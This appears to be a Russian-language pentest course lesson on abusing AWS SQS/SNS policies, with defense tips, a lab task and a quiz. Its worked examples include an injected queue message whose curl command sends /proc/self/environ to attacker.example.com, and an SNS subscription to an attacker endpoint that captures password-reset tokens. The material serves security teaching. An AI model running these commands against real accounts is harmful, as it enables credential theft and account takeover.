---
id: cloud-sqs-sns
title: "SQS и SNS: политики очередей, cross-account и инъекция событий"
category: cloud
parent: cloud-aws-data-deep
difficulty: medium
order: 2
tags: [cloud, aws, sqs, sns, messaging, cross-account, injection]
prerequisites: [cloud-aws-data-deep, cloud-serverless]
useful_for:
  - "Пентест очередей и pub/sub в AWS"
  - "Эксплуатация слабых resource-based policies"
  - "Инъекция событий в Lambda"
estimated_minutes: 45
summary: "SQS и SNS: чтение/запись в очереди, resource-based политики, cross-account подписки, dead-letter queues и инъекция сообщений, запускающих Lambda с широкой ролью."
---

## Зачем этот урок

SQS (очереди) и SNS (pub/sub) — «кровеносная система» современных AWS-приложений. Через них проходят заказы, уведомления, задачи, а иногда и чувствительные данные (токены, PII). Атакующего они интересуют по трём причинам: во-первых, в сообщениях лежат данные; во-вторых, слабая resource-based политика позволяет читать или писать в очередь из чужого аккаунта; в-третьих, подписчик (Lambda/ECS/SQS) обрабатывает сообщение от имени своей привилегированной роли — значит инъекция события может превратиться в выполнение кода или в действие от чужого имени.

## Модель SQS и SNS

**SQS** — буфер сообщений. Бывает стандартным (at-least-once, best-effort ordering) и FIFO (ровно один раз, строгий порядок). Сообщение живёт до `visibility timeout`, потом снова становится видимым. Есть dead-letter queue (DLQ) для «ядовитых» сообщений и long polling.

**SNS** — pub/sub: топик принимает сообщения и рассылает подписчикам (SQS, Lambda, HTTP/S, email, SMS, mobile push). Подписки бывают raw message delivery или с обёрткой.

Доступ регулируется двумя механизмами: **IAM identity-based** политиками (что может делать роль) и **resource-based** политиками на самой очереди/топике (кто извне может к ней обратиться). Именно resource-based политики — частая ошибка: `Principal: "*"` без условий открывает очередь всему интернету.

## Инструменты и команды

```bash
# Инвентаризация
aws sqs list-queues
aws sns list-topics
aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
  --attribute-names All --query 'Attributes.{Arn:QueueArn,Redrive:RedrivePolicy}'

# Чтение очереди (в том числе чужой, если политика позволяет)
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
  --max-number-of-messages 10 --wait-time-seconds 5 --visibility-timeout 0

# Отправка сообщения
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
  --message-body '{"action":"reindex","user":"admin"}'

# Resource-based политика (кто имеет доступ)
aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
  --attribute-names Policy --query 'Attributes.Policy' --output text | jq .

# SNS: подписки и политика топика
aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:111122223333:alerts --query 'Attributes.Policy' --output text | jq .
aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:111122223333:alerts

# Подписка из чужого аккаунта (если политика разрешает)
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:alerts \
  --protocol https --notification-endpoint https://attacker.example.com/hook
```

## Разобранный пример: чтение очереди → инъекция в Lambda

Сценарий: resource-based политика очереди разрешает `sqs:ReceiveMessage` принципалу `*` (частая ошибка при «интеграции с партнёром»).

```bash
aws sqs list-queues
# {"QueueUrls": ["https://sqs.us-east-1.amazonaws.com/111122223333/tasks"]}

aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
  --attribute-names Policy --output text | jq '.Statement[] | {Effect,Principal,Action,Resource}'
# {"Effect":"Allow","Principal":"*","Action":"sqs:ReceiveMessage","Resource":"..."}

# Читаем сообщения — там токены и внутренние задачи
aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
  --max-number-of-messages 10 --wait-time-seconds 5
# {"Messages":[{"Body":"{\"task\":\"deploy\",\"token\":\"ghp_xxx\",\"repo\":\"acme/app\"}", ...}]}
```

Из сообщений достаём GitHub-токен деплоя. Далее проверяем, может ли наша роль писать в очередь (`sqs:SendMessage`) — если да, инъецируем событие, которое обработчик воспримет как команду:

```bash
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
  --message-body '{"task":"run","cmd":"curl http://attacker.example.com/$(cat /proc/self/environ|base64)"}'
```

Если обработчик — Lambda, исполняющая `cmd` из сообщения, это RCE от имени роли функции. Даже без RCE инъекция может изменить бизнес-логику (переиндексация, изменение цен, отправка писем).

## Политики и кросс-аккаунтный доступ

Resource-based политика может выглядеть так:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "*"},
    "Action": ["sqs:SendMessage", "sqs:ReceiveMessage"],
    "Resource": "arn:aws:sqs:us-east-1:111122223333:orders"
  }]
}
```

`Principal: "*"` без `Condition` — открытая дверь: любой AWS-аккаунт читает и пишет. Часто добавляют `Condition` с `aws:SourceArn` или `aws:SourceAccount`, чтобы ограничить отправителя, но забывают про получателя. Проверяйте оба действия отдельно.

SNS-топики с открытой политикой позволяют подписаться извне и получать все уведомления — включая те, что содержат ссылки с токенами сброса пароля. Проверяйте `Condition` с `aws:SourceOwner`.

## Обход защит и edge cases

- **Encryption (SSE-SQS / KMS).** Если очередь зашифрована CMK, для чтения/записи нужен `kms:Decrypt`/`kms:GenerateDataKey`. AWS-owned key не требует явных прав. Проверяйте `KmsMasterKeyId` в атрибутах.
- **VPC endpoint policy.** Очередь может быть доступна только через VPC endpoint с политикой. Тогда из интернета не достучаться — нужен пивот в VPC.
- **FIFO.** Для FIFO нужны `MessageGroupId` и `MessageDeduplicationId`; иначе `send-message` упадёт. Это не защита, но меняет тактику.
- **DLQ.** Ядовитые сообщения уходят в dead-letter queue; она часто менее защищена и содержит те самые «необработанные» данные.
- **Long polling.** `--wait-time-seconds` до 20 уменьшает количество пустых ответов и делает чтение менее шумным.
- **Visibility timeout.** Прочитанное сообщение не удаляется; верните его в очередь (`visibility-timeout 0`) или удалите (`delete-message`) в зависимости от цели.

## Частые ошибки и подводные камни

- Считать, что «очередь неинтересна»: в сообщениях регулярно встречаются токены и PII.
- Забыть проверить и `ReceiveMessage`, и `SendMessage`: открытая на запись очередь так же опасна.
- Путать IAM-политику роли и resource-based политику ресурса — это два независимых барьера.
- Игнорировать SNS как источник ссылок/токенов.
- Не проверить DLQ: там оседают сообщения, которые не смог обработать сервис.

## Защита и детект

- Никогда не использовать `Principal: "*"` без `Condition`; ограничивать `aws:SourceArn`/`aws:SourceAccount`.
- Шифровать очереди CMK и ограничивать `kms:*` конкретными ролями.
- Включать `sqs:SendMessage`/`ReceiveMessage` в CloudTrail (data events) и алертить на кросс-аккаунтные обращения.
- Валидировать сообщения на стороне обработчика: не исполнять команды из тела сообщения.
- Ограничивать DLQ и ротацию; не хранить в сообщениях долгоживущие секреты.

## Модель угроз и типовые мисконфиги

Основной мисконфиг — открытая resource-based политика. Второй по частоте — обработчик, который доверяет телу сообщения (eval/exec/шаблон). Третий — очередь как «бесплатный» канал для инъекции в Lambda с широкой ролью. Четвёртый — SNS-подписка, оставленная на HTTP-endpoint злоумышленника после теста. Пятый — DLQ без шифрования и с PII. Проверяя приложение, всегда задавайте вопрос: «кто может писать в этот вход, и что обработчик с этим делает?».

## Практическое задание

1. Создайте SQS-очередь и SNS-топик в тестовом аккаунте; подпишите очередь на топик.
2. Выдайте роль, у которой есть только `sqs:ReceiveMessage`, и убедитесь, что запись падает.
3. Создайте Lambda-обработчик очереди с ролью, читающей секрет из SSM, и продемонстрируйте инъекцию сообщения.
4. Настройте DLQ и посмотрите, какие сообщения туда попадают.

## Что дальше / решение

Из очередей и топиков достаются токены, ссылки и внутренние команды. Дальше — использовать их против CI/CD, API или других сервисов. Если доступ только на чтение — ищите в сообщениях креды; если на запись — тестируйте инъекцию. Зафиксируйте результат в графе атаки как «данные/креды из очереди» и переходите к следующему сервису. При шифровании CMK без `kms:Decrypt` — `blocked`.

## Разобранный пример 2: SNS-подписка и перехват токенов

SNS-топики часто рассылают ссылки со встроенными токенами: подтверждение email, сброс пароля, magic-link для входа. Если политика топика разрешает подписку извне, эти токены утекают.

```bash
aws sns list-topics
# {"Topics": ["arn:aws:sns:us-east-1:111122223333:user-events"]}

aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
  --query 'Attributes.Policy' --output text | jq '.Statement[] | {Effect,Principal,Action,Condition}'
# {"Effect":"Allow","Principal":"*","Action":"sns:Subscribe","Condition":null}

# Подписываемся своим HTTP-endpoint
aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
  --protocol https --notification-endpoint https://attacker.example.com/hook
# {"SubscriptionArn": "arn:aws:sns:...:user-events:abc-123"}

# На стороне attacker.example.com принимаем POST-сообщения
```

Далее слушаем `attacker.example.com`. Как только пользователь запросит сброс пароля, SNS доставит сообщение с токеном — и мы можем перехватить аккаунт, не зная пароля. Аналогично утекают OTP-уведомления, ссылки на подтверждение платежей и внутренние алерты.

Отдельный сценарий — подмена существующей подписки: если у вас есть `sns:Subscribe`/`sns:Unsubscribe`, можно отписаться от легитимного endpoint и подписаться своим, превратив уведомления в канал эксфильтрации. Для SQS-подписок проверяйте, не снимается ли шифрование при raw message delivery.

## Квиз

```quiz
- question: "Чем опасна resource-based политика SQS с Principal: '*' без Condition?"
  options:
    - "Любой AWS-аккаунт может читать/писать в очередь"
    - "Очередь удаляется"
    - "Меняется биллинг"
    - "Отключается KMS"
  answer: 0
  explanation: "Principal '*' без ограничивающего Condition открывает доступ всем."
- question: "Почему инъекция в SQS может привести к RCE?"
  options:
    - "Подписчик (Lambda/ECS) обрабатывает сообщение от имени своей привилегированной роли"
    - "SQS исполняет код сам"
    - "Очередь хранит SSH-ключи"
    - "SQS меняет IAM"
  answer: 0
  explanation: "Обработчик может исполнить команду/шаблон из тела сообщения от имени своей роли."
- question: "Что нужно, чтобы прочитать очередь, зашифрованную CMK?"
  options:
    - "Право kms:Decrypt на ключ"
    - "Только sqs:ReceiveMessage"
    - "Право ec2:DescribeInstances"
    - "Ничего"
  answer: 0
  explanation: "Без kms:Decrypt сообщение не расшифруется."
- question: "Что такое dead-letter queue (DLQ)?"
  options:
    - "Очередь для сообщений, которые не удалось обработать"
    - "Очередь для админов"
    - "Резервная копия SNS"
    - "Тип IAM-политики"
  answer: 0
  explanation: "DLQ принимает «ядовитые» сообщения и часто содержит необработанные данные."
```

## Где пригодится

- **Пентест AWS:** чтение данных и инъекция через очереди.
- **Red team:** путь от события к роли обработчика.
- **Bug bounty:** облачные приложения с открытыми очередями.
- **Архитектура:** проектирование безопасных resource-based политик.
